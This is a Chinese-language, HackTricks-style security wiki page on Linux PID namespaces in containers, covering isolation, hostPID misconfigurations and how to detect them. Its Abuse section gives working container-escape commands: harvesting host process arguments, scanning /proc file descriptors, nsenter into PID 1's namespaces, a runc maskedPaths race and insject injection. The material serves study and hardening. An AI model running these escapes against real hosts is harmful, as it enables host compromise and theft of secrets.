# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

PID namespace 控制进程的编号方式以及哪些进程可见。这就是为什么 container 即使不是真正的机器，也可以拥有自己的 PID 1。在该 namespace 内，workload 看到的是一个看起来属于本地的进程树。在 namespace 外部，host 仍然能够看到真实的 host PIDs 以及完整的进程环境。

从安全角度来看，PID namespace 很重要，因为进程可见性具有很高的价值。一旦 workload 能够看到 host 进程，它可能就可以观察服务名称、命令行参数、通过进程参数传递的 secrets、通过 `/proc` 获取的环境派生状态，以及潜在的 namespace-entry 目标。如果它不仅能查看这些进程，例如在满足适当条件时向其发送 signals 或使用 ptrace，问题就会变得严重得多。

## 操作

新的 PID namespace 会从自身独立的进程编号开始。该 namespace 内创建的第一个进程，从该 namespace 的角度来看会成为 PID 1，这也意味着它会针对 orphaned children 和 signal behavior 获得类似 init 的特殊语义。这解释了许多 container 中与 init processes、zombie reaping 相关的异常行为，也解释了为什么有时会在 container 中使用小型 init wrappers。

重要的安全经验是：一个进程可能因为只能看到自己的 PID tree 而看似处于隔离状态，但这种隔离可以被有意移除。Docker 通过 `--pid=host` 提供此功能，而 Kubernetes 则通过 `hostPID: true` 实现。一旦 container 加入 host PID namespace，workload 就可以直接看到 host processes，许多后续的 attack paths 也会变得更加现实。

## 实验

手动创建 PID namespace：
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
此时，shell 看到的是一个私有的进程视图。`--mount-proc` flag 非常重要，因为它会挂载一个与新 PID namespace 匹配的 procfs 实例，使内部的进程列表保持一致。

为了比较 container 的行为：
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
这种差异是直接且易于理解的，因此这是一个适合读者的第一个 lab。

## Runtime 使用

Docker、Podman、containerd 和 CRI-O 中的普通容器会获得各自的 PID namespace。除非 workload 明确请求与 host 共享 PID，否则 Kubernetes Pods 通常也会获得隔离的 PID 视图。LXC/Incus 环境依赖相同的 kernel primitive，不过 system-container 使用场景可能会暴露更复杂的进程树，并促使人们采用更多 debugging shortcuts。

同一规则适用于所有环境：如果 runtime 选择不隔离 PID namespace，这就意味着 container boundary 被有意削弱。

## Misconfigurations

最典型的 misconfiguration 是共享 host PID。团队通常会以 debugging、monitoring 或 service-management 便利性为理由，但这始终应被视为一项具有实际安全影响的例外。即使 container 不能立即对 host processes 执行写入操作，仅可见性本身也可能泄露大量系统信息。一旦添加了 `CAP_SYS_PTRACE` 等 capabilities，或提供了有用的 procfs access，风险就会显著扩大。

另一个错误是认为：由于 workload 默认无法 kill 或 ptrace host processes，因此共享 host PID 就是无害的。这个结论忽略了 enumeration 的价值、namespace-entry targets 的可用性，以及 PID 可见性与其他被削弱的 controls 结合后产生的影响。

## Abuse

如果共享了 host PID namespace，attacker 可能检查 host processes、收集 process arguments、识别有价值的 services、定位可供 `nsenter` 使用的候选 PIDs，或将 process visibility 与 ptrace-related privilege 结合起来，干扰 host 或相邻 workloads。在某些情况下，仅仅看到正确的 long-running process，就足以改变后续 attack plan。

第一个实际步骤始终是确认 host processes 确实可见：
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
一旦 host PIDs 可见，进程参数和 namespace-entry 目标通常会成为最有用的信息来源：
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
如果存在 `nsenter` 且拥有足够权限，请测试是否可以将一个可见的主机进程用作 namespace bridge：
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
即使入口被阻断，共享 host PID 仍然很有价值，因为它会暴露服务布局、运行时组件以及可作为下一步目标的潜在特权进程。

host PID 可见性还会使文件描述符滥用更加现实。如果某个特权 host 进程或相邻 workload 打开了敏感文件或 socket，攻击者可能能够检查 `/proc/<pid>/fd/` 并复用该句柄，具体取决于所有权、procfs 挂载选项以及目标服务模型。
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
这些命令很有用，因为它们可以回答 `hidepid=1` 或 `hidepid=2` 是否正在减少跨进程可见性，以及诸如已打开的敏感文件、日志或 Unix sockets 等明显有趣的 descriptors 是否完全可见。

### 完整示例：host PID + `nsenter`

当进程同时拥有足够的权限加入 host namespaces 时，共享 host PID 会直接导致 host escape：
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
如果命令执行成功，容器进程现在便会在主机的 mount、UTS、network、IPC 和 PID namespaces 中执行。其影响是立即攻陷主机。

即使缺少 `nsenter`，只要挂载了主机文件系统，也可能通过主机上的二进制文件实现相同结果：
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Recent Runtime Notes

一些与 PID namespace 相关的攻击并不是传统的 `hostPID: true` 配置错误，而是运行时实现中的 bug，涉及容器设置期间 procfs 保护机制的应用方式。

#### `maskedPaths` race to host procfs

在存在漏洞的 `runc` 版本中，能够控制容器镜像或 `runc exec` workload 的攻击者，可以通过将容器侧的 `/dev/null` 替换为指向敏感 procfs 路径（例如 `/proc/sys/kernel/core_pattern`）的符号链接，来与 masking 阶段进行竞态。如果竞态成功，masked-path bind mount 可能会挂载到错误的目标上，从而向新容器暴露主机全局的 procfs knobs。

Useful review command:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
这很重要，因为最终影响可能与直接暴露 procfs 相同：可写入的 `core_pattern` 或 `sysrq-trigger`，随后导致主机代码执行或拒绝服务。

#### 使用 `insject` 进行 Namespace injection

诸如 `insject` 之类的 Namespace injection 工具表明，PID namespace 交互并不总是要求在创建进程之前预先进入目标 namespace。helper 可以稍后附加，使用 `setns()`，并在保持对目标 PID 空间可见性的同时执行：
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
这类 technique 主要适用于 advanced debugging、offensive tooling 和 post-exploitation workflows，即在 runtime 已经初始化 workload 后，仍必须加入 namespace context 的场景。

### 相关 FD Abuse Patterns

当 host PIDs 可见时，有两种 pattern 值得特别指出。第一，privileged process 可能会在 `execve()` 期间保持 sensitive file descriptor 处于打开状态，因为它没有被标记为 `O_CLOEXEC`。第二，services 可能会通过 Unix sockets 使用 `SCM_RIGHTS` 传递 file descriptors。在这两种情况下，关键对象不再是 pathname，而是 lower-privilege process 可能继承或接收的已打开 handle。

这在 container work 中很重要，因为即使 container filesystem 无法直接访问该路径，这个 handle 仍可能指向 `docker.sock`、privileged log、host secret file 或其他高价值对象。

## 检查

这些命令用于确定该 process 是否拥有 private PID view，或者是否已经能够枚举范围大得多的 process landscape。
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
这里的重点：

- 如果进程列表中包含明显的主机服务，则主机 PID 共享可能已经生效。
- 只看到一个很小的容器本地进程树是正常基线；看到 `systemd`、`dockerd` 或无关的守护进程则不是。
- 一旦可以看到主机 PID，即使是只读的进程信息也能提供有价值的侦察信息。

如果发现某个容器运行时启用了主机 PID 共享，不要将其视为无关紧要的差异。这会显著改变该 workload 能够观察到并可能影响的范围。
{{#include ../../../../../banners/hacktricks-training.md}}
